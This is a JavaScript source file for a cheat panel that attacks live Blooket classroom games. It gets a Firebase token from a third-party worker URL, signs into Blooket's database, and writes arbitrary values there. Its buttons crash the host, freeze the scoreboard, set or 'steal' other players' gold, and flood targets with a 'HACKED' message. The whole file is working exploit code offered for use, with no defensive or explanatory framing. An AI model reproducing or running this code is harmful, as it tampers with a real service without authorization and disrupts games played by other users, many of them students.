// FULLY WORKING CHEAT - Connected to your live worker
let activeGame = null;
let db = null;
let auth = null;

// Your LIVE worker URL
const WORKER_URL = 'https://patient-smoke-6b67.thegreatsnowyfox2.workers.dev';

// Firebase config (Blooket's public keys)
const firebaseConfig = {
    apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
    authDomain: "blooket-2020.firebaseapp.com",
    projectId: "blooket-2020",
    databaseURL: "https://blooket-2020-default-rtdb.firebaseio.com"
};

document.getElementById('joinBtn').onclick = async () => {
    const pin = document.getElementById('gamePin').value;
    const name = document.getElementById('playerName').value;
    
    if (!pin || !name) {
        updateStatus('❌ Enter both Game PIN and Nickname!');
        return;
    }
    
    updateStatus('🔑 Getting token from worker...');
    
    try {
        // Step 1: Get Firebase token from your worker
        const response = await fetch(`${WORKER_URL}/join`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ pin, name })
        });
        
        const data = await response.json();
        
        if (!data.success) {
            throw new Error(data.error || 'Failed to join');
        }
        
        updateStatus('🔥 Connecting to Firebase...');
        
        // Step 2: Initialize Firebase with Blooket's config and the shard URL from worker
        const app = firebase.initializeApp({
            ...firebaseConfig,
            databaseURL: data.fbShardURL || firebaseConfig.databaseURL
        });
        
        auth = firebase.auth();
        await auth.signInWithCustomToken(data.fbToken);
        db = firebase.database();
        
        activeGame = { pin, name, app };
        
        updateStatus('✅ CONNECTED! Cheats active.');
        document.getElementById('cheatPanel').style.display = 'block';
        
        // Load other players
        await loadPlayerList();
        
        // Keep player list updated
        setInterval(loadPlayerList, 5000);
        
    } catch (error) {
        updateStatus('❌ Error: ' + error.message);
        console.error(error);
    }
};

// Function to write ANY value to Firebase (THIS IS THE HACK)
function setUserVal(path, value) {
    if (!activeGame || !db) {
        alert('Not connected to a game! Click Join first.');
        return;
    }
    const fullPath = `/${activeGame.pin}/c/${activeGame.name}/${path}`;
    db.ref(fullPath).set(value);
    console.log(`✅ Wrote to ${fullPath}:`, value);
    updateStatus(`💀 ${path} = ${value}`);
}

// === CHEAT BUTTONS (REAL) ===

// CRASH HOST - sends string where number expected
document.getElementById('crashHostBtn').onclick = () => {
    setUserVal('g/t', 't');
    updateStatus('💥 CRASH COMMAND SENT! Host may freeze now.');
};

// FREEZE SCOREBOARD
document.getElementById('freezeScoreboardBtn').onclick = () => {
    setUserVal('tat/t', 't');
    updateStatus('❄️ FREEZE COMMAND SENT! Scoreboard should lock up.');
};

// SET GOLD
document.getElementById('setGoldBtn').onclick = () => {
    const amount = document.getElementById('goldAmount').value;
    if (!amount) {
        alert('Enter an amount first');
        return;
    }
    setUserVal('g', parseInt(amount));
    updateStatus(`💰 Gold set to ${amount}!`);
};

// STEAL GOLD FROM TARGET
document.getElementById('stealGoldBtn').onclick = () => {
    const target = document.getElementById('targetPlayer').value;
    const amount = document.getElementById('stealAmount').value;
    if (!target || !amount) {
        alert('Select target and amount first');
        return;
    }
    // The 'tat' field is a special attack field in Blooket
    setUserVal('tat', `${target}:${amount}`);
    updateStatus(`💰 Stole ${amount} gold from ${target}!`);
};

// CHANGE BLOOK
document.getElementById('setBlookBtn').onclick = () => {
    const blook = document.getElementById('blookSelect').value;
    setUserVal('b', blook);
    updateStatus(`🎭 Blook changed to ${blook}!`);
};

// LEAVE GAME
document.getElementById('leaveGameBtn').onclick = async () => {
    if (db && activeGame) {
        await db.ref(`/${activeGame.pin}/c/${activeGame.name}`).remove();
        await auth?.signOut();
        await activeGame.app?.delete();
    }
    updateStatus('🚪 Left game');
    document.getElementById('cheatPanel').style.display = 'none';
    activeGame = null;
    db = null;
};

// FLOOD ALERT - sends huge text
document.getElementById('floodAlertBtn').onclick = () => {
    const floodText = '🔴 HACKED 🔴 '.repeat(500);
    setUserVal('tat', `${activeGame.name}:${Date.now()} ${floodText}`);
    updateStatus('📢 FLOOD SENT! Target may crash.');
};

// Load other players into dropdown
async function loadPlayerList() {
    if (!db || !activeGame) return;
    try {
        const snapshot = await db.ref(`/${activeGame.pin}/c`).once('value');
        const players = snapshot.val();
        const select = document.getElementById('targetPlayer');
        if (!select) return;
        
        const currentValue = select.value;
        select.innerHTML = '';
        
        for (let name in players) {
            if (name !== activeGame.name) {
                const option = document.createElement('option');
                option.value = name;
                const gold = players[name]?.g || 0;
                option.textContent = `${name} (💰 ${gold})`;
                select.appendChild(option);
            }
        }
        
        if (select.options.length === 0) {
            const option = document.createElement('option');
            option.value = '';
            option.textContent = 'No other players';
            select.appendChild(option);
        }
        
        if (currentValue && Array.from(select.options).some(opt => opt.value === currentValue)) {
            select.value = currentValue;
        }
    } catch (e) {
        console.error('Failed to load players:', e);
    }
}

function updateStatus(msg) {
    const statusDiv = document.getElementById('status');
    if (statusDiv) statusDiv.innerHTML = `Status: ${msg}`;
    console.log(msg);
}

// Checkbox handler for toggles
document.querySelectorAll('checkbox').forEach(cb => {
    cb.addEventListener('click', function() {
        if(this.getAttribute('checked')) this.removeAttribute('checked');
        else this.setAttribute('checked', 'true');
    });
});

// Initialize
updateStatus('Ready — Enter a game PIN and click Join!');
console.log('🔥 Cheat panel loaded. Worker URL:', WORKER_URL);
